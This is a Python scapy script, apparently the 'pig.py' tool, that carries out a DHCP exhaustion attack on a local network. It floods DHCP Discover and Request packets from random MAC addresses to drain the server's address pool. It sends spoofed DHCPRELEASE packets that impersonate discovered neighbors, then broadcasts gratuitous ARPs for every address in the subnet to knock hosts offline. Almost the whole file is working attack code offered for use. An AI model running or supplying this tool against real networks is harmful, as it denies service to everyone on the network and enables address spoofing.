#! /usr/bin/env python
# -*- coding: utf-8 -*-
"""
DHCP exhaustion attack plus.

Usage:
    pig.py [-d -h -a -i -o] <interface>
  
Options:
    -d, --debug            ... enable scapy verbose output
    -h, --help             <- you are here :)
    -a, --show-arp         ... detect/print arp who_has
    -i, --show-icmp        ... detect/print icmps requests
    -o, --show-options     ... print lease infos
    
    -x, --timeout-threads  ... thread spawn timer (0.4)
    -y, --timeout-dos      ... DOS timeout (8) (wait time to mass grat.arp)
    -z, --timeout-dhcpequest.. dhcp request timeout (2)
"""
from scapy.all import *
import string,binascii,signal,sys,threading,socket,struct,getopt

'''
Defaults
'''
conf.checkIPaddr = False
conf.iface = "lo"
conf.verb = False
show_arp = False
show_icmp = False
show_options = False
timeout={}
timeout['dos']=8        #todo(tintinweb): add these values to getopt
timeout['dhcpip']=2
timeout['timer']=0.4

def checkArgs():
    try:
        opts, args = getopt.getopt(sys.argv[1:], "hdaiox:y:z:")
    except getopt.GetoptError, err:
        # print help information and exit:
        print str(err) # will print something like "option -a not recognized"
        usage()
        sys.exit(2)
    for o,a in opts:
        if o in ("-d,--debug"):
            conf.verb = True
        elif o in ("-h", "--help"):
            usage()
            sys.exit()
        elif o in ("-a", "--show-arp"):
            show_arp = True
        elif o in ("-i", "--show-icmp"):
            show_icmp = True
        elif o in ("-o", "--show-options"):
            show_options=True
        elif o in ("-x", "--timeout-threads"):
            timeout['timer']=float(a)
        elif o in ("-y", "--timeout-dos"):
            timeout['dos']=float(a)
        elif o in ("-z", "--timeout-dhcpequest"):
            timeout['dhcpip']=float(a)
        else:
            assert False, "unhandled option"
    if len(args)==1:
        conf.iface=args[0]
    else:
        usage()
        sys.exit(2)


def signal_handler(signal, frame):
    print 'Exit'
    t1.kill_received = True
    t2.kill_received = True
    sys.exit(0)



######################################
# Necessary Network functions not included in scapy
#
def randomMAC():
    mac = [ 0x00, 0x0c, 0x29,
        random.randint(0x00, 0x7f),
        random.randint(0x00, 0xff),
        random.randint(0x00, 0xff) ]
    return ':'.join(map(lambda x: "%02x" % x, mac))

def toNum(ip):
    "convert decimal dotted quad string to long integer"
    return struct.unpack('L',socket.inet_aton(ip))[0]

def get_ip(ifname):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    return socket.inet_ntoa(fcntl.ioctl(
        s.fileno(),
        0x8915,  # SIOCGIFADDR
        struct.pack('256s', ifname[:15])
    )[20:24])

def get_if_net(iff):
    for net, msk, gw, iface, addr in read_routes():
        if (iff == iface and net != 0L):
            return ltoa(net)
    warning("No net address found for iface %s\n" % iff);

def get_if_ip(iff):
    for net, msk, gw, iface, addr in read_routes():
        if (iff == iface and net != 0L):
            return addr
    warning("No net address found for iface %s\n" % iff);

def calcCIDR(mask):
    mask = mask.split('.')
    bits = []
    for c in mask:
        bits.append(bin(int(c)))
    bits = ''.join(bits)
    cidr = 0
    for c in bits:
        if c == '1': cidr += 1
    return str(cidr)

def unpackMAC(binmac):
    mac=binascii.hexlify(binmac)[0:12]
    blocks = [mac[x:x+2] for x in xrange(0, len(mac), 2)]
    return ':'.join(blocks)




##########################################################
#
#  ARP and create map of LAN neighbors
#
def neighbors():
    global dhcpsip,subnet,nodes
    nodes={}
    m=randomMAC()
    net=dhcpsip+"/"+calcCIDR(subnet)
    ans,unans = srp(Ether(src=m,dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=net,psrc=dhcpsip), timeout=8,
                    filter="arp and arp[7] = 2")
    for request,reply in ans:
        nodes[reply.hwsrc]=reply.psrc
        print "%15s - %s " % (reply.psrc, reply.hwsrc)

#
# send release for our neighbors
#
def release():
    global dhcpsmac,dhcpsip,nodes
    print "***  Sending DHCPRELEASE for neighbors "
    myxid=random.randint(1, 900000000)
    #
    #iterate over all ndoes and release their IP from DHCP server
    for cmac,cip in nodes.iteritems():
        dhcp_release = Ether(src=cmac,dst=dhcpsmac)/IP(src=cip,dst=dhcpsip)/UDP(sport=68,dport=67)/BOOTP(ciaddr=cip,chaddr=[mac2str(cmac)],xid=myxid,)/DHCP(options=[("message-type","release"),("server_id",dhcpsip),("client_id",chr(1),mac2str(cmac)),"end"])
        sendp(dhcp_release)
        print "Releasing %s - %s"%(cmac,cip)
        if conf.verb: print "%r"%dhcp_release

#
#now knock everyone offline
#
def garp():
    global dhcpsip,subnet
    pool=Net(dhcpsip+"/"+calcCIDR(subnet))
    for ip in pool:
        m=randomMAC()
        arpp =  Ether(src=m,dst="ff:ff:ff:ff:ff:ff")/ARP(hwsrc=m,psrc=ip,hwdst="00:00:00:00:00:00",pdst=ip)
        sendp(arpp)
        print "Knocking %s offline, goodbye"%ip
        if conf.verb: print "%r"%arpp

#
# loop and send Discovers
#
class send_dhcp(threading.Thread):
    def __init__ (self):
        threading.Thread.__init__(self)
        self.kill_received = False

    def run(self):
        global timer,dhcpdos
        while not self.kill_received and not dhcpdos:
            m=randomMAC()
            myxid=random.randint(1, 900000000)
            hostname=''.join(random.choice(string.ascii_uppercase + string.digits) for x in range(8))
            dhcp_discover =  Ether(src=m,dst="ff:ff:ff:ff:ff:ff")/IP(src="0.0.0.0",dst="255.255.255.255")/UDP(sport=68,dport=67)/BOOTP(chaddr=[mac2str(m)],xid=myxid)/DHCP(options=[("message-type","discover"),("hostname",hostname),"end"])
            print "[--->] DHCP_Discover"
            sendp(dhcp_discover)
            time.sleep(timer)

#
#
# sniff DHCP Offers and ACK
#
class sniff_dhcp(threading.Thread):
    def __init__ (self):
        threading.Thread.__init__(self)
        self.filter = "arp or icmp or (udp and src port 67 and dst port 68)"
        self.kill_received = False
        self.dhcpcount=0

    def run(self):
        global dhcpdos
        while not self.kill_received and not dhcpdos:
            sniff(filter=self.filter,prn=self.detect_dhcp,store=0,timeout=3)
            if self.dhcpcount>0 : print "[ !! ] timeout waiting on dhcp packet count %d"%self.dhcpcount
            self.dhcpcount+=1
            if self.dhcpcount==2: dhcpdos=True
          
    def detect_dhcp(self,pkt):
        global dhcpsmac,dhcpsip,subnet,show_arp,show_options,show_icmp
        if DHCP in pkt:
            if pkt[DHCP] and pkt[DHCP].options[0][1] == 2:
                self.dhcpcount=0
                dhcpsip = pkt[IP].src
                dhcpsmac = pkt[Ether].src
                for opt in pkt[DHCP].options:
                    if opt[0] == 'subnet_mask':
                        subnet=opt[1]
                        break
                
                myip=pkt[BOOTP].yiaddr
                sip=pkt[BOOTP].siaddr
                localxid=pkt[BOOTP].xid
                localm=unpackMAC(pkt[BOOTP].chaddr)
                myhostname=''.join(random.choice(string.ascii_uppercase + string.digits) for x in range(8))
                print "[<---] DHCP_Offer   " + pkt[Ether].src,sip + " IP: "+myip+" for MAC=["+pkt[Ether].dst+"]"

                if show_options:
                    b = pkt[BOOTP]
                    print "\t* xid=%s"%repr(b.xid)
                    print "\t* CIaddr=%s"%repr(b.ciaddr)        
                    print "\t* YIaddr=%s"%repr(b.yiaddr)
                    print "\t* SIaddr=%s"%repr(b.siaddr)
                    print "\t* GIaddr=%s"%repr(b.giaddr)
                    print "\t* CHaddr=%s"%repr(b.chaddr)
                    print "\t* Sname=%s"%repr(b.sname)
                    for o in pkt[DHCP].options:
                        if isinstance(o,str):
                            if o=="end": break        #supress spam paddings :)
                            print "\t\t* ",repr(o)
                        else:
                            print "\t\t* ",o[0],o[1:]    
                
                dhcp_req = Ether(src=localm,dst="ff:ff:ff:ff:ff:ff")/IP(src="0.0.0.0",dst="255.255.255.255")/UDP(sport=68,dport=67)/BOOTP(chaddr=[mac2str(localm)],xid=localxid)/DHCP(options=[("message-type","request"),("server_id",sip),("requested_addr",myip),("hostname",myhostname),("param_req_list","pad"),"end"])
                print "[--->] DHCP_Request "+myip
                sendp(dhcp_req)
            elif ICMP in pkt:
                if pkt[ICMP].type==8:
                    myip=pkt[IP].dst
                    mydst=pkt[IP].src
                    if show_icmp: print "[ <- ] ICMP_Request "+mydst+" for "+myip 
                    icmp_req=Ether(src=randomMAC(),dst=pkt.src)/IP(src=myip,dst=mydst)/ICMP(type=0,id=pkt[ICMP].id,seq=pkt[ICMP].seq)/"12345678912345678912"
                    if conf.verb: 
                        print "%r"%icmp_req 
                    #sendp(icmp_req)
                    #print "ICMP response from "+myip+" to "+mydst 

            elif ARP in pkt:
                if pkt[ARP].op ==1:        #op=1 who has, 2 is at
                    myip=pkt[ARP].pdst
                    mydst=pkt[ARP].psrc
                    if show_arp: print "[ <- ] ARP_Request " + myip+" from "+mydst
                    #todo(tintinweb):answer arps?


#
#
# MAIN()
#
def main():
    global t1,t2,t3,dhcpdos,dhcpsip,dhcpmac,subnet,nodes,timer
    checkArgs()
    print "[INFO] - using interface %s"%conf.iface
    signal.signal(signal.SIGINT, signal_handler)
    dhcpsip=None
    dhcpsmac=None
    subnet=None
    nodes={}
    dhcpdos=False 
    timer=timeout['timer']
    
    t1=sniff_dhcp()
    t1.start()
    
    t2=send_dhcp()
    t2.start()
    
    while dhcpsip==None:
        time.sleep(timeout['dhcpip'])
        print "[  ? ] \t\twaiting for first DHCP Server response"
    
    neighbors()
    release()
    
    while not dhcpdos:
        time.sleep(timeout['dos'])
        print "[  ? ] \t\twaiting for DHCP pool exhaustion..."
        
    print "[DONE] DHCP pool exhausted!"
    print "[INFO] waiting %s to mass grat.arp!"%timeout['dos']
    time.sleep(timeout['dos'])
    garp()
    print "[DONE] DHCP pool exhausted!"
  
def usage():
    print __doc__
    
if __name__ == '__main__':
    main()



